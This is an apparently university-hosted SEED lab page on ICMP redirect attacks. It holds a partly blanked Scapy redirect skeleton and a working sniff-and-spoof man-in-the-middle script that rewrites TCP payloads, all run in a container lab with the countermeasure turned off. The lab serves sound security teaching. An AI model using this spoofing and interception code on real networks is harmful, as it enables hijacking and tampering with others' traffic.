@@ -1,0 +1,558 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>ICMP Redirect Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="The Mitnick Attack Lab" href="Mitnick_Attack.html" />
+    <link rel="prev" title="Heartbleed Attack Lab" href="Heartbleed.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="network_index.html">Network Security Labs</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="arp_attack.html">ARP Cache Poisoning Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="bgp_basic.html">BGP Lab: Building an Internet Simulator</a></li>
+<li class="toctree-l3"><a class="reference internal" href="dns_in_a_box.html">DNS In a Box</a></li>
+<li class="toctree-l3"><a class="reference internal" href="dns_local.html">Local DNS Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="dns_rebinding.html">DNS Rebinding Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="dns_remote.html">The Kaminsky Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="dnssec.html">DNS Security Extensions (DNSSEC) Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="firewall.html">Firewall Exploration Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="firewall_vpn.html">Firewall Evasion Lab: Bypassing Firewalls using VPN</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Heartbleed.html">Heartbleed Attack Lab</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">ICMP Redirect Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#environment-setup-using-container">Environment Setup using Container</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-launching-icmp-redirect-attack">Task 1: Launching ICMP Redirect Attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-launching-the-mitm-attack">Task 2: Launching the MITM Attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="Mitnick_Attack.html">The Mitnick Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Sniffing_Spoofing.html">Packet Sniffing and Spoofing Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="TCP_Attacks.html">TCP/IP Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="VPN.html">Virtual Private Network (VPN) Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="VPN_Tunnel.html">VPN Lab: The Container Version</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="network_index.html">Network Security Labs</a> &raquo;</li>
+        
+      <li>ICMP Redirect Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="icmp-redirect-attack-lab">
+<h1>ICMP Redirect Attack Lab<a class="headerlink" href="#icmp-redirect-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>An ICMP redirect is an error message sent by a router to the sender of
+an IP packet. Redirects are used when a router believes a packet is
+being routed incorrectly, and it would like to inform the sender that it
+should use a different router for the subsequent packets sent to that
+same destination. ICMP redirect can be used by attackers to change a
+victim’s routing.</p>
+<p>The objective of this task is to launch an ICMP redirect attack on the
+victim, such that when the victim sends packets to <code class="docutils literal notranslate"><span class="pre">192.168.60.5</span></code>, it
+will use the malicious router container (<code class="docutils literal notranslate"><span class="pre">10.9.0.111</span></code>) as its router.
+Since the malicious router is controlled by the attacker, the attacker
+can intercept the packets, make changes, and then send the modified
+packets out. This is a form of the Man-In-The-Middle (MITM) attack. This
+lab covers the following topics:</p>
+<ul class="simple">
+<li><p>The IP and ICMP protocols</p></li>
+<li><p>ICMP redirect attack</p></li>
+<li><p>Routing</p></li>
+</ul>
+<p><strong>Videos.</strong> Detailed coverage of the IP protocol and the attacks at the IP layer can
+be found in the following:</p>
+<ul class="simple">
+<li><p>Section 4 of the SEED Lecture,, Internet Security: A Hands-on Approach, by Wenliang Du. See details
+at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+</ul>
+<p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
+image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
+labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
+</div>
+<div class="section" id="environment-setup-using-container">
+<h2>Environment Setup using Container<a class="headerlink" href="#environment-setup-using-container" title="Permalink to this headline">¶</a></h2>
+<p>In this lab, we need several machines. The lab environment setup is
+depicted in Figure 1. We use containers to set up this environment.</p>
+<div class="section" id="container-setup-and-commands">
+<h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
+<p>Please download the Labsetup.zip file to your VM from the lab’s website, unzip it, enter the Labsetup
+folder, and use the docker-compose.yml file to set up the lab environment. Detailed explanation of the
+content in this file and all the involved Dockerfile can be found from the user manual, which is linked
+to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
+very important that you read the user manual.</p>
+<p>In the following, we list some of the commonly used commands related to Docker and Compose. Since
+we are going to use these commands very frequently, we have created aliases for them in the .bashrc file
+(in our provided SEEDUbuntu 20.04 VM).</p>
+<div class="figure align-center" id="id1">
+<img alt="../../_images/icmp_redirect_img1.png" src="../../_images/icmp_redirect_img1.png" />
+<p class="caption"><span class="caption-text">Figure 1: Lab environment setup</span><a class="headerlink" href="#id1" title="Permalink to this image">¶</a></p>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ docker-compose build   # Build the container image
+$ docker-compose up      # Start the container
+$ docker-compose down    # Shut down the container
+
+// Aliases for the Compose commands above
+$ dcbuild                # Alias for: docker-compose build
+$ dcup                   # Alias for: docker-compose up
+$ dcdown                 # Alias for: docker-compose down
+</pre></div>
+</div>
+<p>All the containers will be running in the background. To run commands on a container, we often need
+to get a shell on that container. We first need to use the “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">ps</span></code>” command to find out the ID of
+the container, and then use “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">exec</span></code>” to start a shell on that container. We have created aliases for
+them in the <code class="docutils literal notranslate"><span class="pre">.bashrc</span></code> file.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ dockps           // Alias for: docker ps --format &quot;{{.ID}} {{.Names}}&quot;
+$ docksh &lt;id&gt;      // Alias for: docker exec -it &lt;id&gt; /bin/bash
+
+// The following example shows how to get a shell inside hostC
+$ dockps
+b1004832e275 hostA-10.9.0.5
+0af4ea7a3e2e hostB-10.9.0.6
+9652715c8e0a hostC-10.9.0.7
+
+$ docksh 96
+root@9652715c8e0a:/#
+
+// Note: If a docker command requires a container ID, you do not need to
+//       type the entire ID string. Typing the first few characters will
+//       be sufficient, as long as they are unique among all the containers.
+</pre></div>
+</div>
+<p>If you encounter problems when setting up the lab environment, please read the “Common Problems”
+section of the manual for potential solutions.</p>
+</div>
+<div class="section" id="about-the-attacker-container">
+<h3>About the Attacker Container<a class="headerlink" href="#about-the-attacker-container" title="Permalink to this headline">¶</a></h3>
+<p>In this lab, we can either use the VM or the attacker container as the
+attacker machine. If you look at the Docker Compose file, you will see
+that the attacker container is configured differently from the other
+containers. Here are the differences:</p>
+<ul>
+<li><p><em>Shared folder.</em> When we use the attacker container to launch
+attacks, we need to put the attacking code inside the attacker
+container. Code editing is more convenient inside the VM than in containers,
+because we can use our favorite editors. In order for the VM and container to share files, we have
+created a shared folder between the VM and the container using the Docker <code class="docutils literal notranslate"><span class="pre">volumes</span></code>. If you look
+at the Docker Compose file, you will find out that we have added the following entry to some of the
+containers. It indicates mounting the <code class="docutils literal notranslate"><span class="pre">./volumes</span></code> folder on the host machine (i.e., the VM) to the
+<code class="docutils literal notranslate"><span class="pre">/volumes</span></code> folder inside the container. We will write our code in the <code class="docutils literal notranslate"><span class="pre">./volumes</span></code> folder (on the
+VM), so they can be used inside the containers.
+volumes:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>- ./volumes:/volumes
+</pre></div>
+</div>
+</li>
+<li><p><em>Privileged mode.</em>  To be able to modify kernel parameters at runtime (using <code class="docutils literal notranslate"><span class="pre">sysctl</span></code>), such as enabling
+IP forwarding, a container needs to be privileged. This is achieved by including the following entry
+in the Docker Compose file for the container.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>privileged: true
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+</div>
+<div class="section" id="task-1-launching-icmp-redirect-attack">
+<h2>Task 1: Launching ICMP Redirect Attack<a class="headerlink" href="#task-1-launching-icmp-redirect-attack" title="Permalink to this headline">¶</a></h2>
+<p>In the Ubuntu operating system, there is a countermeasure against the
+ICMP redirect attack. In the Compose file, we have already turned off
+the countermeasure by configuring the victim container to accept ICMP
+redirect messages.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// In docker-compose.yml
+sysctls:
+      - net.ipv4.conf.all.accept_redirects=1
+
+// To turn the protection on, set its value to 0
+# sysctl net.ipv4.conf.all.accept_redirects=0
+</pre></div>
+</div>
+<p>For this task, we will attack the victim container from the attacker
+container. In the current setup, the victim will use the router
+container (<code class="docutils literal notranslate"><span class="pre">192.168.60.11</span></code>) as the router to get to the
+<code class="docutils literal notranslate"><span class="pre">192.168.60.0/24</span></code> network. If we run <code class="docutils literal notranslate"><span class="pre">ip</span> <span class="pre">route</span></code> on the victim
+container, we will see the following</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># ip route
+default via 10.9.0.1 dev eth0
+10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5
+192.168.60.0/24 via (10.9.0.11) dev eth0
+</pre></div>
+</div>
+<p><strong>Code skeleton.</strong> A code skeleton is provided in the following, with some of the essential
+parameters left out. Students should fill in the proper values in the
+places marked by <code class="docutils literal notranslate"><span class="pre">&#64;&#64;&#64;&#64;</span></code>.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/usr/bin/python3
+
+from scapy.all import *
+
+ip = IP(src = @@@@,  dst = @@@@)
+icmp = ICMP(type=@@@@, code=@@@@)
+icmp.gw = @@@@
+
+# The enclosed IP packet should be the one that
+# triggers the redirect message.
+ip2 = IP(src = @@@@, dst = @@@@)
+send(ip/icmp/ip2/ICMP());
+</pre></div>
+</div>
+<p><strong>Verification.</strong> ICMP redirect messages will not affect the routing table; instead, it
+affects the routing cache. Entries in the routing cache overwrite those
+in the routing table, until the entries expire. To display and clean the
+cache contents, we can use the following commands:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Display the routing cache
+# ip route show cache
+192.168.60.5 via 10.9.0.111 dev eth0
+    cache &lt;redirected&gt; expires 296sec
+
+// Clean the routing cache
+# ip route flush cache
+</pre></div>
+</div>
+<p>Please do a traceroute on the victim machine, and see whether the packet
+is rerouted or not.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># mtr -n 192.168.60.5
+</pre></div>
+</div>
+<p><strong>A strange issue.</strong> While developing this lab, we have observed a strange issue in the
+container environment. The issue does not exist if the victim is a VM,
+instead of a container. If we spoof the redirect packets, but the victim
+machine is not sending out ICMP packets during the attack, the attack
+will never be successful. This is not the case for the VM setting.
+Moreover, the <code class="docutils literal notranslate"><span class="pre">ip2</span></code> inside the redirect packet must match with the
+type and the destination IP address of the packets that the victim is
+currently sending (ICMP for ICMP, UDP for UDP, etc.).</p>
+<p>It seems that the OS kernel conducts some kind of sanity check before
+accepting an ICMP redirect packets. We have not figured out what exactly
+caused this, and why the VM does not have these restrictions. This is an
+open issue for the SEED labs, and we encourage students to help us
+resolve this issue. We recommend instructors to give students bonus
+points if they have indeed resolved this issue.</p>
+<p>Before we find a way to disable this checking mechanism, when we launch
+the attack, we should should <code class="docutils literal notranslate"><span class="pre">ping</span></code> the <code class="docutils literal notranslate"><span class="pre">192.168.60.5</span></code> host on the
+victim machine.</p>
+<p><strong>Questions.</strong> After you have succeeded in the attack, please conduct the following
+experiments, and see whether your attack can still succeed. Please
+explain your observations:</p>
+<ul>
+<li><p>Question 1: Can you use ICMP redirect attacks to redirect to a remote
+machine? Namely, the IP address assigned to <code class="docutils literal notranslate"><span class="pre">icmp.gw</span></code> is a computer
+not on the local LAN. Please show your experiment result, and explain
+your observation.</p></li>
+<li><p>Question 2: Can you use ICMP redirect attacks to redirect to a
+non-existing machine on the same network? Namely, the IP address
+assigned to <code class="docutils literal notranslate"><span class="pre">icmp.gw</span></code> is a local computer that is either offline or
+non-existing. Please show your experiment result, and explain your
+observation.</p></li>
+<li><p>Question 3: If you look at the <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> file, you will
+find the following entries for the malicious router container. What
+are the purposes of these entries? Please change their value to
+<code class="docutils literal notranslate"><span class="pre">1</span></code>, and launch the attack again. Please describe and explain your
+observation.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>sysctls:
+     - net.ipv4.conf.all.send_redirects=0
+     - net.ipv4.conf.default.send_redirects=0
+     - net.ipv4.conf.eth0.send_redirects=0
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+<div class="section" id="task-2-launching-the-mitm-attack">
+<h2>Task 2: Launching the MITM Attack<a class="headerlink" href="#task-2-launching-the-mitm-attack" title="Permalink to this headline">¶</a></h2>
+<p>Using the ICMP redirect attack, we can get the victim to use our
+malicious router (<code class="docutils literal notranslate"><span class="pre">10.9.0.111</span></code>) as the router for the destination
+<code class="docutils literal notranslate"><span class="pre">192.168.60.5</span></code>. Therefore, all packets from the victim machine to this
+destination will be routed through the malicious router. We would like
+to modify the victim’s packets.</p>
+<p>Before launching the MITM attack, we start a TCP client and server
+program using <code class="docutils literal notranslate"><span class="pre">netcat</span></code>. See the following commands.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>On the destination container 192.168.60.5, start the netcat server:
+# nc -lp 9090
+
+On the victim container, connect to the server:
+# nc 192.168.60.5 9090
+</pre></div>
+</div>
+<p>Once the connection is made, you can type messages on the victim
+machine. Each line of messages will be put into a TCP packet sent to the
+destination, which simply displays the message. Your task is to replace
+every occurrence of your first name in the message with a sequence of
+A’s. The length of the sequence should be the same as that of your first
+name, or you will mess up the TCP sequence number, and hence the entire
+TCP connection. You need to use your real first name, so we know the
+work is done by you.</p>
+<p><strong>Disabling IP Forwarding.</strong> In the setup, the malicious router’s IP forwarding is enabled, so it
+does function like a router and forward packets for others. When we
+launch the MITM attack, we have to stop forwarding IP packets; instead,
+we will intercept the packet, make a change, and send out a new packet.
+To do that, we just need to disable the IP forwarding on the malicious
+router.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl net.ipv4.ip_forward=0
+</pre></div>
+</div>
+<p><strong>MITM code.</strong> Once the IP forwarding is disabled, our program needs to take over the
+role of packet forwarding from the victim to the target, of course after
+making changes to the packets. Since the packet’s destination is not for
+us, the kernel will not give the packet to us; it will simply drops the
+packet. However, if our program is a sniffer program, we will get the
+packet from the kernel. Therefore, we will use the sniff-and-spoof
+technique to implement this MITM attack. In the following, we provide a
+sample sniff-and-spoof program, which captures TCP packets, makes some
+changes, before sending them out. You can find the code from the lab
+setup files.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_pkt(pkt):
+   newpkt = IP(bytes(pkt[IP]))
+   del(newpkt.chksum)
+   del(newpkt[TCP].payload)
+   del(newpkt[TCP].chksum)
+
+   if pkt[TCP].payload:
+       data = pkt[TCP].payload.load
+       print(&quot;*** %s, length: %d&quot; % (data, len(data)))
+
+       # Replace a pattern
+       newdata = data.replace(b&#39;seedlabs&#39;, b&#39;AAAAAAAA&#39;)
+
+       send(newpkt/newdata)
+   else:
+       send(newpkt)
+
+f = &#39;tcp&#39;
+pkt = sniff(iface=&#39;eth0&#39;, filter=f, prn=spoof_pkt)
+</pre></div>
+</div>
+<p>It should be noted that the code above captures all the TCP packets,
+including the one generated by the program itself. That is undesirable,
+as it will affect the performance. Students needs to change the filter,
+so it does not capture its own packets.</p>
+<p><strong>Questions.</strong> After you have succeeded in the attack, please answer the following
+questions:</p>
+<ul class="simple">
+<li><p>Question 4: In your MITM program, you only need to capture the
+traffics in one direction. Please indicate which direction, and
+explain why.</p></li>
+<li><p>Question 5: In the MITM program, when you capture the <code class="docutils literal notranslate"><span class="pre">nc</span></code> traffics
+from A (<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>), you can use A’s IP address or MAC address in
+the filter. One of the choices is not good and is going to create
+issues, even though both choices may work. Please try both, and use
+your experiment results to show which choice is the correct one, and
+please explain your conclusion.</p></li>
+</ul>
+</div>
+<div class="section" id="submission">
+<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
+have observed. You also need to provide explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation. Simply attaching code without any
+explanation will not receive credits.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="Mitnick_Attack.html" class="btn btn-neutral float-right" title="The Mitnick Attack Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="Heartbleed.html" class="btn btn-neutral float-left" title="Heartbleed Attack Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
